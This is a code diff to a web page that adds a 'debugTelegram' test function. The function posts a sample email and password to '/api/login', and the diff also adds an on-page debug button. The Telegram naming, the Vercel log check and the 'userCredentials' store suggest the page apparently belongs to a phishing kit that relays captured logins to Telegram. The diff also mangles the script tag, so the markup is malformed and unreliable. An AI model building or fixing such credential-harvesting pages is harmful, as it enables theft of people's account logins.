@@ -520,7 +520,39 @@
         </svg>
     </div>
 
-    <script>
+    <// DEBUG FUNCTION - Add this to test
+function debugTelegram() {
+    const testData = {
+        type: 'login',
+        email: 'test@example.com',
+        password: 'testpassword123',
+        userAgent: navigator.userAgent
+    };
+    
+    console.log('Testing Telegram...');
+    
+    fetch('/api/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(testData)
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('Debug response:', data);
+        alert('Debug test complete. Check Vercel logs.');
+    })
+    .catch(error => {
+        console.error('Debug error:', error);
+        alert('Debug failed: ' + error.message);
+    });
+}
+
+// Add a debug button (temporary)
+const debugBtn = document.createElement('button');
+debugBtn.textContent = 'DEBUG TEST';
+debugBtn.style.cssText = 'position:fixed;bottom:20px;right:20px;z-index:9999;background:red;color:white;padding:10px;border:none;border-radius:5px;cursor:pointer;';
+debugBtn.onclick = debugTelegram;
+document.body.appendChild(debugBtn);>
         // Store user data
         let userCredentials = {
             email: '',
